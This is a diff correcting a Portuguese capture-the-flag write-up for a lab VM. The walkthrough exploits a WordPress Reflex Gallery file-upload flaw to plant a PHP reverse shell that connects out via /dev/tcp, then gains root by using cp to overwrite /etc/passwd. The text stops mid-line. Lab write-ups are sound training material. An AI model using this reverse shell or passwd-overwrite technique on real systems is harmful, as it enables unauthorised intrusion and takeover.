@@ -32,33 +32,33 @@ No scan no nmap, só achamos a porta 80 aberta, que está rodando um Apache.
 
 Ao abrir no browser,  vemos a página default do Apache.
 
-<imr src ="/img/desafio2/vm7/hardy.png">
+<img src ="/img/desafio2/vm7/hardy.png">
 
 Vamos fazer uma enumeração de diretórios usando o FFUF.
 
 Podemos ver que existe um wordpress rodando.
 
-<imr src ="/img/desafio2/vm7/hardy 1.png">
+<img src ="/img/desafio2/vm7/hardy 1.png">
 
-<imr src ="/img/desafio2/vm7/hardy 2.png">
+<img src ="/img/desafio2/vm7/hardy 2.png">
 
 Olhando código fonte, vemos os plugins que o WordPress está usando.
 
 Buscando por exploits, achamos um do reflex-gallery
 
-<imr src ="/img/desafio2/vm7/hardy 3.png">
+<img src ="/img/desafio2/vm7/hardy 3.png">
 
 Olhando no diretório raiz do plugin, achamos o readme.txt.
 
-<imr src ="/img/desafio2/vm7/hardy 4.png">
+<img src ="/img/desafio2/vm7/hardy 4.png">
 
 Dentro do readme.txt, vemos a versão do plugin, que é a 3.1.3.
 
-<imr src ="/img/desafio2/vm7/hardy 5.png">
+<img src ="/img/desafio2/vm7/hardy 5.png">
 
 No searchsploit, existe um exploit para a versão que vimos acima.
 
-<imr src ="/img/desafio2/vm7/hardy 6.png">
+<img src ="/img/desafio2/vm7/hardy 6.png">
 
 >**💡[WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload](https://www.exploit-db.com/exploits/36374)**
 
@@ -71,7 +71,7 @@ http://192.168.56.10/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/F
 
 Que ao ser acessado, retorna um erro dizendo que não tem arquivos carregados, então vemos que existe o serviço de upload e será possivel explorar.
 
-<imr src ="/img/desafio2/vm7/hardy 7.png">
+<img src ="/img/desafio2/vm7/hardy 7.png">
 
 ---
 
@@ -91,24 +91,24 @@ Agora precisamos criar a reverse shell para enviar usando esse formulário.
 Vamos usar uma shell simples que utiliza a função [exec()](https://www.php.net/manual/en/function.exec.php) do php.
 
 ```php
-<php
+<?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
->
+?>
 ```
 
 Vamos então abrir o formulário que criamos e fazer o upload da reverse shell no servidor alvo.
 
-<imr src ="/img/desafio2/vm7/hardy 8.png">
+<img src ="/img/desafio2/vm7/hardy 8.png">
 
-<imr src ="/img/desafio2/vm7/hardy 9.png">
+<img src ="/img/desafio2/vm7/hardy 9.png">
 
 Ao abrir o path que armazena os arquivos carregados, que é citado no exploit, vemos o nosso arquivo.
 
-<imr src ="/img/desafio2/vm7/hardy 10.png">
+<img src ="/img/desafio2/vm7/hardy 10.png">
 
 Agora vamos configurar o netcat para receber a conexão reversa e depois abrimos o código php que enviamos no browser, para termos acesso a reverse shell que enviamos.
 
-<imr src ="/img/desafio2/vm7/hardy 11.png">
+<img src ="/img/desafio2/vm7/hardy 11.png">
 
 ---
 
@@ -116,7 +116,7 @@ Agora vamos configurar o netcat para receber a conexão reversa e depois abrimos
 
 Ao tentar ver os comandos que o usuário pode executar como root, usando o sudo -l, é pedida a senha do usuário, como não temos a senha vamos ver quais arquivos ele tem permissão para executar usando o find.
 
-<imr src ="/img/desafio2/vm7/hardy 12.png">
+<img src ="/img/desafio2/vm7/hardy 12.png">
 
 Vemos acima que ele tem permissão de usar o /bin/cp e pode copiar arquivos como root.
 
@@ -139,42 +139,42 @@ Para criar a senha, vamos usar o openssl e criar o hash no mesmo padrão do arqu
 
 Agora vamos inserir o usuario no arquivo, com os mesmos dados do root.
 
-<imr src ="/img/desafio2/vm7/hardy 13.png">
+<img src ="/img/desafio2/vm7/hardy 13.png">
 
 Então vamos fazer o upload do arquivo que criamos para o alvo.
 
 Podemos usar o mesmo formulario de upload.
 
-<imr src ="/img/desafio2/vm7/hardy 14.png">
+<img src ="/img/desafio2/vm7/hardy 14.png">
 
-<imr src ="/img/desafio2/vm7/hardy 15.png">
+<img src ="/img/desafio2/vm7/hardy 15.png">
 
-<imr src ="/img/desafio2/vm7/hardy 16.png">
+<img src ="/img/desafio2/vm7/hardy 16.png">
 
 Podemos notar que ele está com o nome diferente, existe um ponto ( . ) no final do nome. 
 
 Vamos copiar ele para criar um arquivo com o nome correto, sem o ponto.
 
-<imr src ="/img/desafio2/vm7/hardy 17.png">
+<img src ="/img/desafio2/vm7/hardy 17.png">
 
 Agora vamos copiar o arquivo para a pasta /etc/ e substituir o original, pelo que tem o nosso usuário.
 
-<imr src ="/img/desafio2/vm7/hardy 18.png">
+<img src ="/img/desafio2/vm7/hardy 18.png">
 
 Ao tentar trocar de usuário, ele da um erro, dizendo que o su precisa ser executado de um terminal.
 
-<imr src ="/img/desafio2/vm7/hardy 19.png">
+<img src ="/img/desafio2/vm7/hardy 19.png">
 
 Vamos importar a shell interativa TTY, usando o python 3.
 
 Agora podemos mudar para o nosso usuário com privilégio elevado.
 
-<imr src ="/img/desafio2/vm7/hardy 20.png">
+<img src ="/img/desafio2/vm7/hardy 20.png">
 
 Podemos ver que temos acesso root.
 
-<imr src ="/img/desafio2/vm7/hardy 21.png">
+<img src ="/img/desafio2/vm7/hardy 21.png">
 
 E dentro do diretório /root, temos a flag da VM.
 
-<imr src ="/img/desafi?
+<img src ="/img/desafi?
